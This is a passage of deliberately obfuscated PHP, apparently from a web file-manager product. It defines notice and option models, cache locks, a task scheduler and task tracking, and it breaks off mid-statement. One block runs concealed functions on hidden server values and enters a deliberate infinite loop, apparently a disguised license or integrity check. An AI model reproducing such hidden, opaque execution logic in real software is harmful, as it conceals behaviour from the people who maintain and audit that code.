$this->ipAddress($aïÁ¢‰Ûà¹); $aïÁ¢‰Ûà¹[$AøäÁÓÍ¬[425]] = $Eî­¤òÂÅ; $c‰“²™±Š[$C‘Ş—ºÌ¦] = $aïÁ¢‰Ûà¹; goto bÀ²äÑÒ˜ç; D¼‚ºÓµí: if ($A“Ç›î¬Šß > 0 && abs($aïÁ¢‰Ûà¹[$AøäÁÓÍ¬[192]] - $BÈ¹ë„©[$A“Ç›î¬Šß - 1][$AøäÁÓÍ¬[192]]) < 5) { continue; } $Eî­¤òÂÅ = json_decode($aïÁ¢‰Ûà¹[$AøäÁÓÍ¬[425]], !0); $aïÁ¢‰Ûà¹[$AøäÁÓÍ¬[2065]] = isset($Eî­¤òÂÅ[$AøäÁÓÍ¬[2065]]) ? $Eî­¤òÂÅ[$AøäÁÓÍ¬[2065]] : $AøäÁÓÍ¬[33]; goto dŸÉõ¿‘·è; dŸÉõ¿‘·è: unset($Eî­¤òÂÅ[$AøäÁÓÍ¬[2065]]); $C‘Ş—ºÌ¦ = $this->deviceType($Eî­¤òÂÅ[$AøäÁÓÍ¬[1885]]); if (isset($c‰“²™±Š[$C‘Ş—ºÌ¦])) { continue; } goto dÅÛÇÛºˆ–; bÀ²äÑÒ˜ç: } return array_values($c‰“²™±Š); } public function deviceType($Eö¬Ÿ‘î) { return $Eö¬Ÿ‘î; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\156\157\x74\x69\143\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x63\157\x6e\164\145\156\164", "\x61\165\x74\x68", "\155\x6f\x64\x65", "\x74\x69\155\x65", "\164\171\x70\x65", "\x6c\x65\x76\x65\154", "\145\x6e\141\142\154\145", "\x73\x6f\162\164"); public function listData($E“Úˆ•õîÔ = false, $Fæ’çÔ°Ø = "\163\157\162\164", $e–ÊøÀêë‰ = false) { return parent::listData($E“Úˆ•õîÔ, $Fæ’çÔ°Ø, $e–ÊøÀêë‰); } public function add($Cè—Ê‘®Êá) { $a“¶Ëˆ·÷ =& $_SERVER[¹Ò‹Ò¹]; $aä‘™¤ŠŞ = time(); if ($Cè—Ê‘®Êá[$a“¶Ëˆ·÷[12]] == $a“¶Ëˆ·÷[2076]) { $aä‘™¤ŠŞ = strtotime($Cè—Ê‘®Êá[$a“¶Ëˆ·÷[195]]); } $Cè—Ê‘®Êá[$a“¶Ëˆ·÷[195]] = $aä‘™¤ŠŞ; return parent::insert($Cè—Ê‘®Êá); } public function update($b®Š²²ŒÂè, $Bî¬Ÿµ êÓ) { goto eÓë‘”Ò…«; eÓë‘”Ò…«: $Cí®¥éàº½ =& $_SERVER[¹Ò‹Ò¹]; $a›ˆ¡˜±Š = $this->listData($b®Š²²ŒÂè); if (!$a›ˆ¡˜±Š) { return !1; } goto CÑ…íİáë; Cº›è–Ëƒ: return parent::update($b®Š²²ŒÂè, $Bî¬Ÿµ êÓ); goto aäõÃ…¸Çè; CÑ…íİáë: $E›Ş¬Ü†ŒÂ = time(); if ($Bî¬Ÿµ êÓ[$Cí®¥éàº½[12]] == $Cí®¥éàº½[2076]) { $E›Ş¬Ü†ŒÂ = strtotime($Bî¬Ÿµ êÓ[$Cí®¥éàº½[195]]); } $Bî¬Ÿµ êÓ[$Cí®¥éàº½[195]] = $E›Ş¬Ü†ŒÂ; goto Cº›è–Ëƒ; aäõÃ…¸Çè: } public function remove($f‘´‰ª¬¶å) { $F‚¨èÉĞÎ = $this->listData($f‘´‰ª¬¶å); if (!$F‚¨èÉĞÎ || $F‚¨èÉĞÎ[$_SERVER[¹Ò‹Ò¹][1144]]) { return !1; } return parent::remove($f‘´‰ª¬¶å); } public function sort($A¶ „Ö…ï’, $a …¨‚†³) { return parent::update($A¶ „Ö…ï’, $a …¨‚†³); } public function enable($eè‚ñ’…©Ê, $döçÓ×¤Ö) { return parent::update($eè‚ñ’…©Ê, array($_SERVER[¹Ò‹Ò¹][2077] => $döçÓ×¤Ö)); } private function initUserOption() { $b®× ‡Ë†â =& $_SERVER[¹Ò‹Ò¹]; $this->optionType = $b®× ‡Ë†â[2078]; $this->modelType = $b®× ‡Ë†â[2079]; $this->field = array($b®× ‡Ë†â[2080], $b®× ‡Ë†â[28], $b®× ‡Ë†â[195], $b®× ‡Ë†â[29], $b®× ‡Ë†â[2081], $b®× ‡Ë†â[704], $b®× ‡Ë†â[188]); } public function userNoticeGet($D‚à”ÅÆÔí = false) { $this->initUserOption(); return parent::listData($D‚à”ÅÆÔí, $_SERVER[¹Ò‹Ò¹][388], !0); } public function userNoticeAdd($aŒ“İöœ‚„) { $døÍ›õß„° =& $_SERVER[¹Ò‹Ò¹]; $this->initUserOption(); $dÂ”“‘·ƒ† = $this->findByKey($døÍ›õß„°[2080], $aŒ“İöœ‚„[$døÍ›õß„°[388]]); if ($dÂ”“‘·ƒ†) { return !0; } $FĞšìĞ‚ = array($døÍ›õß„°[2080] => $aŒ“İöœ‚„[$døÍ›õß„°[388]], $døÍ›õß„°[28] => $aŒ“İöœ‚„[$døÍ›õß„°[28]], $døÍ›õß„°[195] => $aŒ“İöœ‚„[$døÍ›õß„°[195]], $døÍ›õß„°[29] => isset($aŒ“İöœ‚„[$døÍ›õß„°[29]]) ? $aŒ“İöœ‚„[$døÍ›õß„°[29]] : 1, $døÍ›õß„°[2081] => isset($aŒ“İöœ‚„[$døÍ›õß„°[2081]]) ? $aŒ“İöœ‚„[$døÍ›õß„°[2081]] : 0, $døÍ›õß„°[704] => 0, $døÍ›õß„°[188] => 0); return parent::insert($FĞšìĞ‚); } public function userNoticeEdit($Eª“™’«ï, $a¡„”¤Ã‘š) { $this->initUserOption(); return parent::update($Eª“™’«ï, $a¡„”¤Ã‘š); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\x6c\x65", "\x72\x6f\154\x65\x47\x72\157\x75\x70", "\x72\145\147\x69\x73\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($FôÕ×Ô»óÄ) { return "\x53\171\163\x74\x65\155\x4f\x70\x74\x69\x6f\156\x5f{$FôÕ×Ô»óÄ}"; } protected function optionDefault($EÇåÓ—¾Ë³ = '') { $c˜ºì„…¤ä =& $_SERVER[¹Ò‹Ò¹]; if ($EÇåÓ—¾Ë³ == $c˜ºì„…¤ä[33]) { return $GLOBALS[$c˜ºì„…¤ä[6]][$c˜ºì„…¤ä[376]]; } } } goto eÄ¨ƒ¤½; f¯‰à£ì…˜: class CacheLockRedis { public function lock($e…Õƒ¦°æí, $A‡‰¿¼ Ôï = 10) { $b¿ˆß–¢¢ò = Cache::init(); $b—öğ•ìì = microtime(!0) + $A‡‰¿¼ Ôï; while (microtime(!0) < $b—öğ•ìì) { $E†½ª§ËåÏ = $b¿ˆß–¢¢ò->get($e…Õƒ¦°æí); if (!$E†½ª§ËåÏ) { $d¹­¬†Ñö– = $b¿ˆß–¢¢ò->setLock($e…Õƒ¦°æí, $b—öğ•ìì, $A‡‰¿¼ Ôï); if ($d¹­¬†Ñö–) { return !0; } } else { if ($E†½ª§ËåÏ < microtime(!0)) { $b¿ˆß–¢¢ò->set($e…Õƒ¦°æí, $b—öğ•ìì, $A‡‰¿¼ Ôï * 2); if ($b¿ˆß–¢¢ò->get($e…Õƒ¦°æí) === $E†½ª§ËåÏ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($CĞ«İÌ§ÕÔ) { return Cache::init()->get($CĞ«İÌ§ÕÔ); } public function unlock($dßˆİõØ–ñ) { return Cache::init()->remove($dßˆİõØ–ñ); } } class CacheLockMemcached { public function lock($C’‘¹ÃåÖ­, $FÖá¿›ÄÂÄ = 0) { $C†Í‘ÛÓè® = Cache::init(); $a×¹÷“‘—É = microtime(!0) + $FÖá¿›ÄÂÄ; while (microtime(!0) < $a×¹÷“‘—É) { $FÖµ¦—ôÈ = $C†Í‘ÛÓè®->get($C’‘¹ÃåÖ­); if (!$FÖµ¦—ôÈ || $FÖµ¦—ôÈ < microtime(!0)) { $bÏ÷Ø…ì = $C†Í‘ÛÓè®->handle->add($C’‘¹ÃåÖ­, $a×¹÷“‘—É, $FÖá¿›ÄÂÄ); if ($bÏ÷Ø…ì) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C«¤ãÍ™Ó®) { return Cache::init()->get($C«¤ãÍ™Ó®); } public function unlock($BóÙì¹õˆç) { return Cache::init()->remove($BóÙì¹õˆç); } } if (!isset($_SERVER[$_SERVER[¹Ò‹Ò¹][800]]) || !isset($_SERVER[$_SERVER[¹Ò‹Ò¹][801]])) { goto b¶±–İ³÷™; E´ŸÊô»Ÿ»: $b…æÀİ˜Ï($_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]); $CÎ§Ì¼¶çÍ = 2; while ($CÎ§Ì¼¶çÍ > 1) { $d¶Ô¸ëŞ¾º = rawurlencode($CÎ§Ì¼¶çÍ . $_SERVER[¹Ò‹Ò¹][373]); } goto f‚šœ‰‰‘®; b¶±–İ³÷™: $c®ÁÜš¥ÒØ = $_SERVER[¹Ò‹Ò¹][802]; $C‘•Ò•Œ = $_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]; $d‘ĞÁµ„ÌÎ = $c®ÁÜš¥ÒØ($C‘•Ò•Œ); goto eÎÖÅ¬š®Ğ; eÎÖÅ¬š®Ğ: $fÖ‡Ø×—Ë = explode($_SERVER[¹Ò‹Ò¹][227], $d‘ĞÁµ„ÌÎ); if (count($fÖ‡Ø×—Ë) < $_SERVER[¹Ò‹Ò¹][592]) { $cßóÔ×Â¯É = $_SERVER[¹Ò‹Ò¹][805]; $cßóÔ×Â¯É(); } $b…æÀİ˜Ï = $_SERVER[¹Ò‹Ò¹][806]; goto E´ŸÊô»Ÿ»; f‚šœ‰‰‘®: } goto DØ»Åô·Ñß; b„§¶æø™Ä: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto b÷à¦¡Ëµá; b÷à¦¡Ëµá: $bì¥Õè´ æ =& $_SERVER[¹Ò‹Ò¹]; if (self::valueGet($bì¥Õè´ æ[704]) != $bì¥Õè´ æ[86]) { return; } if (self::valueGet($bì¥Õè´ æ[1468]) == $bì¥Õè´ æ[86]) { $EÂ³öİë = self::valueGet($bì¥Õè´ æ[1469]); if (time() - $EÂ³öİë > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto BˆóçÉöŸö; BˆóçÉöŸö: http_close(); self::valueSet($bì¥Õè´ æ[1468], $bì¥Õè´ æ[86]); Hook::bind($bì¥Õè´ æ[1470], $bì¥Õè´ æ[1471]); goto F¸í¨Á¹ß­; F¸í¨Á¹ß­: while (!0) { self::cacheClear(); if (self::valueGet($bì¥Õè´ æ[704]) != $bì¥Õè´ æ[86]) { self::valueSet($bì¥Õè´ æ[1468], $bì¥Õè´ æ[491]); self::log($bì¥Õè´ æ[1472]); die; } self::valueSet($bì¥Õè´ æ[1468], $bì¥Õè´ æ[86]); self::valueSet($bì¥Õè´ æ[1469], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto cº™é÷ƒ‹; cº™é÷ƒ‹: } public static function restart() { $A²³ë·Ì²« =& $_SERVER[¹Ò‹Ò¹]; http_close(); self::valueSet($A²³ë·Ì²«[704], $A²³ë·Ì²«[491]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($A²³ë·Ì²«[1468], $A²³ë·Ì²«[491]); self::valueSet($A²³ë·Ì²«[704], $A²³ë·Ì²«[86]); } public static function shutdownEvent() { $C¢²ñòïÉ =& $_SERVER[¹Ò‹Ò¹]; self::valueSet($C¢²ñòïÉ[1468], $C¢²ñòïÉ[491]); self::log($C¢²ñòïÉ[1473]); } public static function config($Cß£­õÈ¼©, $c’Ú‡£±ÌÜ) { self::valueSet($_SERVER[¹Ò‹Ò¹][704], $Cß£­õÈ¼©); } private static function taskRunAll() { goto e„ˆ—Ë¤‘°; cÒ©¦í›¼: $dÀ„Äš¡Ø· = count($d‡¤õÚŠß); for ($BÎæñéñ¨ˆ = 0; $BÎæñéñ¨ˆ < $dÀ„Äš¡Ø·; $BÎæñéñ¨ˆ++) { $F–ÂÓâ¦êÌ = $d‡¤õÚŠß[$BÎæñéñ¨ˆ]; if (!$F–ÂÓâ¦êÌ[$E–‘ÅÒ±Şß[388]] || $F–ÂÓâ¦êÌ[$E–‘ÅÒ±Şß[1475]] != $E–‘ÅÒ±Şß[86]) { continue; } if (!self::taskTimeCheck($F–ÂÓâ¦êÌ)) { continue; } self::taskRun($F–ÂÓâ¦êÌ); } Hook::trigger($E–‘ÅÒ±Şß[1476]); goto eááÜš§Ê; e„ˆ—Ë¤‘°: $E–‘ÅÒ±Şß =& $_SERVER[¹Ò‹Ò¹]; $bÜë‰âĞ¡§ = timeFloat(); $d‡¤õÚŠß = Model($E–‘ÅÒ±Şß[1474])->listData(); goto cÒ©¦í›¼; eááÜš§Ê: self::taskQueueRun($bÜë‰âĞ¡§); self::closeDatabase(); goto bäÙšÀ§½å; bäÙšÀ§½å: } private static function taskQueueRun($eÚñ›’«) { $c¹Í”ÊëÜ = 10; while (!0) { $eå›Íø«…Ç = TaskQueue::run(); if ($eå›Íø«…Ç === !1) { break; } if (timeFloat() - $eÚñ›’« >= $c¹Í”ÊëÜ) { break; } } } private static function taskTimeCheck($Aá¡•ÌÔó) { goto BÃ¯÷®ô; BšÆ²¢µ: $DÅÛê©’Ô = strtotime($DØèÂ¦æ¶Â[1477] . $F¯™¢áˆì¸[$DØèÂ¦æ¶Â[1478]] . $DØèÂ¦æ¶Â[1479]) - strtotime($DØèÂ¦æ¶Â[1480]); $FõÎáŞç‡ = time() - strtotime(date($DØèÂ¦æ¶Â[1481]) . $DØèÂ¦æ¶Â[1482]); $e­Äİ³†”ã = $FõÎáŞç‡ >= $DÅÛê©’Ô && $FõÎáŞç‡ <= $DÅÛê©’Ô + 3600; goto bˆÂäÜÏã; bˆÂäÜÏã: switch ($F¯™¢áˆì¸[$DØèÂ¦æ¶Â[29]]) { case $DØèÂ¦æ¶Â[1483]: if (time() - $bßñêÙ‹Ò¶ < 3600 * 24 * 30) { return !1; } if ($F¯™¢áˆì¸[$DØèÂ¦æ¶Â[1483]] == date($DØèÂ¦æ¶Â[1484]) && $e­Äİ³†”ã) { return !0; } break; case $DØèÂ¦æ¶Â[1485]: if (time() - $bßñêÙ‹Ò¶ < 3600 * 24 * 7) { return !1; } $Bª¶¨çÁÏ„ = date($DØèÂ¦æ¶Â[1486]) == 0 ? 7 : date($DØèÂ¦æ¶Â[1486]); if ($F¯™¢áˆì¸[$DØèÂ¦æ¶Â[1485]] == $Bª¶¨çÁÏ„ && $e­Äİ³†”ã) { return !0; } break; case $DØèÂ¦æ¶Â[1478]: if (time() - $bßñêÙ‹Ò¶ < 3600 * 24) { return !1; } if ($e­Äİ³†”ã) { return !0; } break; case $DØèÂ¦æ¶Â[1487]: if (time() - $bßñêÙ‹Ò¶ >= floatval($F¯™¢áˆì¸[$DØèÂ¦æ¶Â[1487]]) * 60) { return !0; } break; default: break; } return !1; goto D“¬œ”ôš½; BÃ¯÷®ô: $DØèÂ¦æ¶Â =& $_SERVER[¹Ò‹Ò¹]; $F¯™¢áˆì¸ = json_decode($Aá¡•ÌÔó[$DØèÂ¦æ¶Â[195]], !0); $bßñêÙ‹Ò¶ = intval($Aá¡•ÌÔó[$DØèÂ¦æ¶Â[1469]]); goto BšÆ²¢µ; D“¬œ”ôš½: } private static function closeDatabase() { goto cõÜ†¯Ëƒ; e¯éìÌ˜À­: if (!$bÍ¢Æ‡Åª‹) { $bÍ¢Æ‡Åª‹ = time(); } if (time() - $bÍ¢Æ‡Åª‹ < $dÔí”’†‡) { return; } $bÍ¢Æ‡Åª‹ = time(); goto fõØ¦¨Èò; fõØ¦¨Èò: $aÙ‚¼õ“™ = Model($b¨¸‘“î”à[497])->db($b¨¸‘“î”à[33]); if ($aÙ‚¼õ“™) { $aÙ‚¼õ“™->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($b¨¸‘“î”à[1488], $b¨¸‘“î”à[1489]); die; } goto fÅŸÍ¶›Œ; cõÜ†¯Ëƒ: $b¨¸‘“î”à =& $_SERVER[¹Ò‹Ò¹]; static $bÍ¢Æ‡Åª‹ = 0; $dÔí”’†‡ = 1800; goto e¯éìÌ˜À­; fÅŸÍ¶›Œ: } public static function taskRun($f·¸„ªµÎ±) { goto eä‡ÛÂ¯ší; eä‡ÛÂ¯ší: $dÊ´×ÖÉ‡« =& $_SERVER[¹Ò‹Ò¹]; self::log($dÊ´×ÖÉ‡«[1490] . $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[388]] . $dÊ´×ÖÉ‡«[1491] . $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[28]] . $dÊ´×ÖÉ‡«[1492] . $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[1493]]); Model($dÊ´×ÖÉ‡«[1474])->run($f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[388]]); goto c—ÁÀÎòÁÚ; cİ¥°‚ö”š: Model($dÊ´×ÖÉ‡«[1494])->add(array($dÊ´×ÖÉ‡«[1495] => $dÊ´×ÖÉ‡«[33], $dÊ´×ÖÉ‡«[1496] => $dÊ´×ÖÉ‡«[491], $dÊ´×ÖÉ‡«[29] => $dÊ´×ÖÉ‡«[1497] . $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[388]], $dÊ´×ÖÉ‡«[1498] => json_encode(array($dÊ´×ÖÉ‡«[28] => $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[28]], $dÊ´×ÖÉ‡«[1499] => timeFloat() - $E„ Ì†Ñ«À, $dÊ´×ÖÉ‡«[289] => $FïÉÈ™Ø¨İ)))); self::log($dÊ´×ÖÉ‡«[1500] . $f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[388]] . $dÊ´×ÖÉ‡«[1501] . $FïÉÈ™Ø¨İ); return !0; goto d©…Ÿ¼•§‘; c—ÁÀÎòÁÚ: $E„ Ì†Ñ«À = timeFloat(); $FïÉÈ™Ø¨İ = $dÊ´×ÖÉ‡«[33]; switch ($f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[29]]) { case $dÊ´×ÖÉ‡«[303]: $cİÜÈ‡Î¤ = url_request($f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[1493]], $dÊ´×ÖÉ‡«[226], !1, !1, !1, !1, 5); $FïÉÈ™Ø¨İ = strlen($cİÜÈ‡Î¤); break; case $dÊ´×ÖÉ‡«[225]: $FïÉÈ™Ø¨İ = Hook::apply($f·¸„ªµÎ±[$dÊ´×ÖÉ‡«[1493]]); default: break; } goto cİ¥°‚ö”š; d©…Ÿ¼•§‘: } private static function valueGet($B«İ¨¹÷) { $f¤èõ†¦Š” =& $_SERVER[¹Ò‹Ò¹]; $cŠÇÊƒê¬ = $f¤èõ†¦Š”[1502]; $DÔ»Œ¿ïù‡ = Model($f¤èõ†¦Š”[1503])->get($B«İ¨¹÷, $cŠÇÊƒê¬); if (is_null($DÔ»Œ¿ïù‡)) { Model($f¤èõ†¦Š”[1503])->set($f¤èõ†¦Š”[704], $f¤èõ†¦Š”[86], $cŠÇÊƒê¬); Model($f¤èõ†¦Š”[1503])->set($f¤èõ†¦Š”[1468], $f¤èõ†¦Š”[491], $cŠÇÊƒê¬); $DÔ»Œ¿ïù‡ = Model($f¤èõ†¦Š”[1503])->get($B«İ¨¹÷, $cŠÇÊƒê¬); } return $DÔ»Œ¿ïù‡; } private static function valueSet($Fğ‰‰‹Ÿç, $D–¹ÂÎ”Ü) { $aèø‚‰èòÂ =& $_SERVER[¹Ò‹Ò¹]; return Model($aèø‚‰èòÂ[1503])->set($Fğ‰‰‹Ÿç, $D–¹ÂÎ”Ü, $aèø‚‰èòÂ[1502]); } protected static function log($f«ê™“ôõ›) { write_log($f«ê™“ôõ›, $_SERVER[¹Ò‹Ò¹][1489]); } private static function cacheClear() { $fÂƒ‹ï¤é =& $_SERVER[¹Ò‹Ò¹]; $d«Š¤öœ” = Model($fÂƒ‹ï¤é[1503])->cacheKey($fÂƒ‹ï¤é[1502]); Cache::clearMemory($d«Š¤öœ”); Model($fÂƒ‹ï¤é[1474])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($A‡å†à¨¾, $BßŒäÅí¿ = '', $f‘×”¦ìé = 0, $DÌì®òËæ¸ = '') { goto c¬ÆŒˆä¡; c¬ÆŒˆä¡: $b¦¨±Ûãˆ =& $_SERVER[¹Ò‹Ò¹]; if (self::get($A‡å†à¨¾)) { return; } $this->task = array($b¦¨±Ûãˆ[388] => $A‡å†à¨¾, $b¦¨±Ûãˆ[1504] => USER_ID, $b¦¨±Ûãˆ[1410] => $DÌì®òËæ¸, $b¦¨±Ûãˆ[29] => $BßŒäÅí¿, $b¦¨±Ûãˆ[999] => $b¦¨±Ûãˆ[33], $b¦¨±Ûãˆ[997] => $f‘×”¦ìé, $b¦¨±Ûãˆ[1011] => 0, $b¦¨±Ûãˆ[1505] => 0, $b¦¨±Ûãˆ[1506] => 0, $b¦¨±Ûãˆ[735] => timeFloat(), $b¦¨±Ûãˆ[734] => 0, $b¦¨±Ûãˆ[1507] => 0, $b¦¨±Ûãˆ[1508] => 0, $b¦¨±Ûãˆ[1509] => 0, $b¦¨±Ûãˆ[704] => $b¦¨±Ûãˆ[1468]); goto EÀŒ‡»æŸ; EÀŒ‡»æŸ: $GLOBALS[$b¦¨±Ûãˆ[1510]] = 1; Hook::bind($b¦¨±Ûãˆ[1470], array($this, $b¦¨±Ûãˆ[1511])); Hook::bind($b¦¨±Ûãˆ[1512], array($this, $b¦¨±Ûãˆ[1513])); goto e‘ÜÉé‘ ô; e‘ÜÉé‘ ô: $this->startAfter(); Hook::trigger($b¦¨±Ûãˆ[1514], $this->task); $this->task[$b¦¨±Ûãˆ[1507]] = timeFloat(); goto D¹Èâ›Ï¾²; D¹Èâ›Ï¾²: } public function end() { goto dÂ“ãÇÖˆ; cò½Â†´µ÷: $e…Ç¶ìŒà = timeFloat() - $this->task[$dÒôÁàŒ¡[735]]; self::log($dÒôÁàŒ¡[1515] . $this->task[$dÒôÁàŒ¡[388]] . $dÒôÁàŒ¡[1516] . $e…Ç¶ìŒà . $dÒôÁàŒ¡[1517]); Hook::unbind($dÒôÁàŒ¡[1470], array($this, $dÒôÁàŒ¡[1511])); goto Bò ¦ŸùÕİ; dÂ“ãÇÖˆ: $dÒôÁàŒ¡ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->task) { return; } if ($this->task[$dÒôÁàŒ¡[1507]]) { self::valueSet($this->task[$dÒôÁàŒ¡[388]], !1); } goto cò½Â†´µ÷; Bò ¦ŸùÕİ: Hook::unbind($dÒôÁàŒ¡[1512], array($this, $dÒôÁàŒ¡[1513])); $this->endAfter(); $this->task = !1; goto b¢òÁ; b¢òÁ: } public function update($Bìâˆ½Æ› = 0, $D‘À‚”«İ = false) { goto A«ç’¶…ÜÎ; A¾Ä–ïöÈ: $dò¸‰ôœ­á[$cÏˆëšÏµù[1011]] += $Bìâˆ½Æ›; $dò¸‰ôœ­á[$cÏˆëšÏµù[734]] = timeFloat(); if ($dò¸‰ôœ­á[$cÏˆëšÏµù[997]]) { if ($dò¸‰ôœ­á[$cÏˆëšÏµù[997]] < $dò¸‰ôœ­á[$cÏˆëšÏµù[1011]]) { $dò¸‰ôœ­á[$cÏˆëšÏµù[997]] = $dò¸‰ôœ­á[$cÏˆëšÏµù[1011]]; } $c‡¯Ñ†¨¿ = timeFloat() - $dò¸‰ôœ­á[$cÏˆëšÏµù[735]] - $dò¸‰ôœ­á[$cÏˆëšÏµù[1508]]; $dò¸‰ôœ­á[$cÏˆëšÏµù[1505]] = $dò¸‰ôœ­á[$cÏˆëšÏµù[1011]] / $dò¸‰ôœ­á[$cÏˆëšÏµù[997]]; $dò¸‰ôœ­á[$cÏˆëšÏµù[1506]] = $dò¸‰ôœ­á[$cÏˆëšÏµù[1011]] / $c‡¯Ñ†¨¿; if ($dò¸‰ôœ­á[$cÏˆëšÏµù[1505]] > 0) { $dò¸‰ôœ­á[$cÏˆëšÏµù[1509]] = $c‡¯Ñ†¨¿ * (1 - $dò¸‰ôœ­á[$cÏˆëšÏµù[1505]]) / $dò¸‰ôœ­á[$cÏˆëšÏµù[1505]]; } $dò¸‰ôœ­á[$cÏˆëšÏµù[1509]] = $dò¸‰ôœ­á[$cÏˆëšÏµù[1509]] <= 0 ? 0 : $dò¸‰ôœ­á[$cÏˆëšÏµù[1509]]; } goto B¿¸¹ÏËÎ¿; AÏŒª²”Üõ: $dò¸‰ôœ­á[$cÏˆëšÏµù[704]] = $b¦êùÑãºô ? $b¦êùÑãºô : $dò¸‰ôœ­á[$cÏˆëšÏµù[704]]; $dò¸‰ôœ­á[$cÏˆëšÏµù[1508]] = $F—‹Î“¡„À[$cÏˆëšÏµù[1508]] ? $F—‹Î“¡„À[$cÏˆëšÏµù[1508]] : 0; $dò¸‰ôœ­á[$cÏˆëšÏµù[1507]] = timeFloat(); goto DƒÜæ¯õ¥Ç; A«ç’¶…ÜÎ: $cÏˆëšÏµù =& $_SERVER[¹Ò‹Ò¹]; $dò¸‰ôœ­á =& $this->task; if (!$dò¸‰ôœ­á) { return; } goto A¾Ä–ïöÈ; a§š«È‡Óƒ: $F—‹Î“¡„À = self::get($dò¸‰ôœ­á[$cÏˆëšÏµù[388]]); $b¦êùÑãºô = $F—‹Î“¡„À[$cÏˆëšÏµù[704]]; if ($b¦êùÑãºô == self::STATYS_KILL) { $e«âŒÈå­ = array($cÏˆëšÏµù[1518] => LNG($cÏˆëšÏµù[1519]), $cÏˆëšÏµù[1061] => !1); Cache::set($cÏˆëšÏµù[1520] . $this->task[$cÏˆëšÏµù[388]], $e«âŒÈå­, 30); $this->end(); die; } else { if ($b¦êùÑãºô == self::STATYS_STOP) { $EâçùŞ·Çç = 2; $F—‹Î“¡„À[$cÏˆëšÏµù[1508]] += $EâçùŞ·Çç; self::valueSet($dò¸‰ôœ­á[$cÏˆëšÏµù[388]], $F—‹Î“¡„À); sleep($EâçùŞ·Çç); $this->update(); return; } } goto AÏŒª²”Üõ; B¿¸¹ÏËÎ¿: $this->updateAfter(); $AóìÁÏÀàÃ = 0.2; if (timeFloat() - $dò¸‰ôœ­á[$cÏˆëšÏµù[1507]] < $AóìÁÏÀàÃ && !$D‘À‚”«İ) { return; } goto a§š«È‡Óƒ; DƒÜæ¯õ¥Ç: Hook::trigger($cÏˆëšÏµù[1521], $dò¸‰ôœ­á); self::valueSet($dò¸‰ôœ­á[$cÏˆëšÏµù[388]], $dò¸‰ôœ­á); goto cçç»¨âÖ‘; cçç»¨âÖ‘: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($dùÜ†ÍºÒğ) { $Fª„¶Ñâ˜Ô =& $_SERVER[¹Ò‹Ò¹]; Cache::set($Fª„¶Ñâ˜Ô[1520] . $this->task[$Fª„¶Ñâ˜Ô[388]], $dùÜ†ÍºÒğ, 60); return $dùÜ†ÍºÒğ; } public static function get($FÄºáˆãµ£) { return self::valueGet($FÄºáˆãµ£); } public static function listData() { $aÄÈÖ’‘ = self::valueGet(); return array_sort_by($aÄÈÖ’‘, $_SERVER[¹Ò‹Ò¹][735], !0); } public static function kill($A‚ÌÌ¶î¸’) { return self::changeStatus($A‚ÌÌ¶î¸’, self::STATYS_KILL); } public static function stop($c‘„§µº›‹) { return self::changeStatus($c‘„§µº›‹, self::STATYS_STOP); } public static function restart($AÔ¼â§‚Ø) { return self::changeStatus($AÔ¼â§‚Ø, self::STATYS_RUNNING); } public static function killAll() { $E¸åêù˜½½ =& $_SERVER[¹Ò‹Ò¹]; $A†¢×é‚ª = self::listData(); foreach ($A†¢×é‚ª as $dÚâ¶ˆîò ) { self::kill($dÚâ¶ˆîò [$E¸åêù˜½½[388]]); } sleep(2); foreach ($A†¢×é‚ª as $dÚâ¶ˆîò ) { self::valueSet($dÚâ¶ˆîò [$E¸åêù˜½½[388]], !1); } } private static function changeStatus($F¬¡È‰×Åß, $BË¬¹‹ğÕ) { goto EÈ¦Ä”š’¸; C³«‹‰÷ğò: return !0; goto F÷ùàÖĞÆ; EÈ¦Ä”š’¸: $dÅŞÒÏ—˜ =& $_SERVER[¹Ò‹Ò¹]; $d½¾îŒŸ¹º = self::valueGet($F¬¡È‰×Åß); if (!$d½¾îŒŸ¹º) { return !1; } goto D›Œ†á³; D›Œ†á³: $d½¾îŒŸ¹º[$dÅŞÒÏ—˜[704]] = $BË¬¹‹ğÕ; self::valueSet($F¬¡È‰×Åß, $d½¾îŒŸ¹º); self::log($dÅŞÒÏ—˜[1522] . $d½¾îŒŸ¹º[$dÅŞÒÏ—˜[388]] . $dÅŞÒÏ—˜[1523] . $BË¬¹‹ğÕ); goto C³«‹‰÷ğò; F÷ùàÖĞÆ: } public static function valueGet($Aµ¥¶™¡ = false) { $BÔŠÛØºë± =& $_SERVER[¹Ò‹Ò¹]; if ($Aµ¥¶™¡) { $F÷ğ®ƒ¡ª = Model($BÔŠÛØºë±[419])->where(array($BÔŠÛØºë±[92] => $Aµ¥¶™¡, $BÔŠÛØºë±[29] => $BÔŠÛØºë±[1524]))->find(); return 